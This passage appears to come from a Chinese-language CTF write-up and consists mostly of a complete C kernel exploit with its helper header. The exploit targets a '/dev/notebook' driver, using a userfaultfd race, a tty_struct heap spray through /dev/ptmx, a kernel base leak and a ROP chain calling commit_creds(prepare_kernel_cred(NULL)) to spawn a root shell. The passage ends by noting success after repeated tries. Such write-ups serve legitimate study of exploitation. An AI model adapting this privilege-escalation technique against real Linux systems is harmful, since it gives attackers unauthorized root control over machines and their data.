            errExit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                          ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl((int)uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");
    }
}

void getShell(){
    if(getuid())
        errExit("Failed to get root privilege");
    printf("\033[1;32mSuccessfully get root shell!\n\033[m");
    system("/bin/sh");
}

int main(){
    saveStatus();
    page_size = sysconf(_SC_PAGESIZE);
    page = (char*)malloc(0x1000);
    memset(page, 'a', 0x1000);
    fd = open("/dev/notebook", O_RDWR);

    mmap_space = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("\033[1;34mMmap executed, mmap address: %p\n\033[m", mmap_space);
    registerUserFaultFd(mmap_space, 0x1000, fault_handler_thread);
    printf("\033[1;34mMmap space userfaultfd registered.\n\033[m");

    for(int i=0; i<0x10; i++)
        noteadd(i, TTY_STRUCT_SIZE, page);
    printf("\033[1;34mNotebook filled.\n\033[m");
    notebook_msg(true);
    sleep(1);

    for(int i=0; i<0x10; i++)
        pthread_create(&edit_thread, NULL, noteedit_exp, (void*)i); // trigger page fault, freeing all notes
    printf("\033[1;34mCreated 16 paused thread of edit and freeing all notes.\n\033[m");
    sleep(1);

//    for(int i=0; i<0x10; i++)
//        sem_post(&edit_sem);
//    sleep(1);

    for(int i=0; i<0x60; i++)
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    printf("\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m");
    sleep(1);

    for(int i=0; i<0x10; i++)
        pthread_create(&add_thread, NULL, noteadd_exp, (void*)i);
    notebook_msg(true);
    sleep(1);

//    for(int i=0; i<0x10; i++)
//        sem_post(&add_sem);
//    sleep(1);

    char ttyinfo[0x300];
    memset(ttyinfo, 0, 0x300);
    char* hit_address = NULL;
    int hit_idx = -1;
    char* fake_ttyops_address = NULL;
    int fake_ttyops_idx = -1;
    size_t* fake_stack_address = NULL;
    int fake_stack_idx = -1;
    for(int i=0; i<0x10; i++){
        read(fd, ttyinfo, i);
        int header = *((int*)ttyinfo);
        if(header == 0x5401 || header ==  0x5402){
            hit_address = notebook_msg(false)[i].note;
            hit_idx = i;
        }else{
            if(fake_ttyops_idx == -1){
                fake_ttyops_address = (char*)(notebook_msg(false)[i].note);
                fake_ttyops_idx = i;
            }
            else{
                fake_stack_address = (size_t*)(notebook_msg(false)[i].note);
                fake_stack_idx = i;
            }
        }
        if(hit_address && fake_stack_address)
            break;
    }
    if(hit_address == NULL)
        errExit("Failed to access tty_struct in notes.");
    if(fake_stack_address == NULL)
        errExit("Failed to find fake stack address.");
    printf("\033[1;32mSuccessfully accessed tty_struct in note #%d, address: %p\n\033[m", hit_idx, hit_address);
    printf("\033[1;32mSuccessfully found fake tty_struct_operations in note #%d, address: %p\n\033[m", fake_ttyops_idx, fake_ttyops_address);
    printf("\033[1;32mSuccessfully found fake stack in note #%d, address: %p\n\033[m", fake_stack_idx, fake_stack_address);

    printf("\033[1;34mReady to get base address of kernel by file_operations ptr.\n\033[m");
    u_int64_t tty_operation = ((u_int64_t*)ttyinfo)[3];
    printf("\033[1;32mtty_operations address: %p\n\033[m", (void*)tty_operation);
    u_int64_t offset = 0;
    if((tty_operation & 0xFFF) == (ptm_unix98_ops & 0xFFF))     // this file_operations is ptm_unix98_ops
        offset = tty_operation - ptm_unix98_ops;
    else if((tty_operation & 0xFFF) == (pty_unix98_ops & 0xFFF))    // this file_operations is pty_unix98_ops
        offset = tty_operation - pty_unix98_ops;
    else
        errExit("Unexpected tty_operations address.");
    printf("\033[1;32mBase address got.\n\033[m");

    u_int64_t base_address = kernel_BASE + offset;
    void (*commit_creds)() = (void(*)())(commit_creds_BASE + offset);
    void (*prepare_kernel_cred)() = (void(*)())(prepare_kernel_cred_BASE + offset);
    void (*swapgs_restore_regs_and_return_to_usermode)() = (void(*)())(SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset);
    printf("\033[1;32mBase address: %zx.\n\033[m", base_address);
    printf("\033[1;32mOffset: %zx.\n\033[m", offset);
    printf("\033[1;32mcommit_creds: %p.\n\033[m", commit_creds);
    printf("\033[1;32mprepare_kernel_cred: %p.\n\033[m", prepare_kernel_cred);
    printf("\033[1;32mswapgs_restore_regs_and_return_to_usermode: %p.\n\033[m", swapgs_restore_regs_and_return_to_usermode);

    printf("\033[1;34mReady to trigger the first stack pivoting.\n\033[m");
    noteedit(fake_ttyops_idx, sizeof(struct tty_operations), page);
    noteedit(fake_stack_idx, 0x100, page);
    notebook_msg(true);

    char original_tty[TTY_STRUCT_SIZE];
    read(fd, original_tty, hit_idx);
    printf("\033[1;34mUnchanged tty_struct content:\n\033[m");
    print_binary(original_tty, TTY_STRUCT_SIZE);

    char fake_tty[TTY_STRUCT_SIZE];
    memcpy(fake_tty, original_tty, TTY_STRUCT_SIZE);

    size_t fake_tty_ops[0x200];
    memset(fake_tty_ops, 0, sizeof fake_tty_ops);
    size_t push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret = 0xffffffff81238d50;
    ((struct tty_operations*)fake_tty_ops)->write = (int (*)(struct tty_struct *, const unsigned char *, int)) (
            push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret + offset);
    printf("\033[1;34mfake_tty_operations edited, write pointer: %p\n\033[m", ((struct tty_operations*)fake_tty_ops)->write);
    printf("\033[1;35mFirst gadget:\n"
           "\tpush rdi;\n"
           "\tpop rsp;\n"
           "\tpop rbp;\n"
           "\tadd rax, rdx;\n"
           "\tret;\n"
           "This gadget is used to migrate rsp to tty_struct in note #%d.\n\033[m", hit_idx);

    size_t pop_rbx_pop_rbp_ret = 0xffffffff81002141;
    size_t mov_rsp_rbp_pop_rbp_ret = 0xffffffff8107875c;
    ((size_t*)fake_tty)[1] = pop_rbx_pop_rbp_ret + offset;
    ((size_t*)fake_tty)[3] = (size_t) notebook_msg(false)[fake_ttyops_idx].note;
    ((size_t*)fake_tty)[4] = mov_rsp_rbp_pop_rbp_ret + offset;

    size_t pop_rbp_ret = 0xffffffff81000367;
    ((size_t*)fake_tty_ops)[1] = pop_rbp_ret + offset;
    ((size_t*)fake_tty_ops)[2] = (size_t) notebook_msg(false)[fake_stack_idx].note;
    ((size_t*)fake_tty_ops)[3] = mov_rsp_rbp_pop_rbp_ret + offset;

    size_t pop_rdi_ret = 0xffffffff81007115;
    size_t mov_rdi_rax_pop_rbp_ret = 0xffffffff81045833;
    size_t rop[0x60] = {0};
    int ropidx = 0;
    rop[ropidx++] = 0xdeadbeefdeadbeef;     // for pop rbp
    rop[ropidx++] = pop_rdi_ret + offset;
    rop[ropidx++] = 0;
    rop[ropidx++] = (size_t)prepare_kernel_cred;    // prepare_kernel_cred(NULL);
    rop[ropidx++] = mov_rdi_rax_pop_rbp_ret + offset;
    rop[ropidx++] = 0xdeadbeefdeadbeef;
    rop[ropidx++] = (size_t)commit_creds;           // commit_creds(prepare_kernel_cred(NULL));
    rop[ropidx++] = (size_t)swapgs_restore_regs_and_return_to_usermode + 22;
    rop[ropidx++] = 0;
    rop[ropidx++] = 0;
    rop[ropidx++] = (size_t)&getShell;
    rop[ropidx++] = user_cs;
    rop[ropidx++] = user_rflags;
    rop[ropidx++] = user_sp;
    rop[ropidx++] = user_ss;

    write(fd, rop, fake_stack_idx);
    write(fd, fake_tty_ops, fake_ttyops_idx);
    write(fd, fake_tty, hit_idx);
    printf("\033[1;32mEvil data written, ready to exploit....\n\033[m");

    sleep(2);
    for(int i=0; i<0x60; i++)
        write(ptmx_fds[i], page, 200);

    return 0;
}
```
uffdexploit.h:
```c
//
// Created by root on 22-7-28.
//
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

static pthread_t monitor_thread;
size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\n\033[0m");
}

void errExit(char * msg)
{
    printf("\033[1;31m[x] Error: %s\n\033[m", msg);
    exit(EXIT_FAILURE);
}

/**
 * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler
 */
void registerUserFaultFd(void * addr, unsigned long len, void* (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl((int)uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl((int)uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
    printf("---------------------------------------------------------------------------\n");
    printf("Address info starting in %p:\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    printf("---------------------------------------------------------------------------\n");
}
```

![](17.png)

成功getshell（有较高的失败率，需要多次尝试）
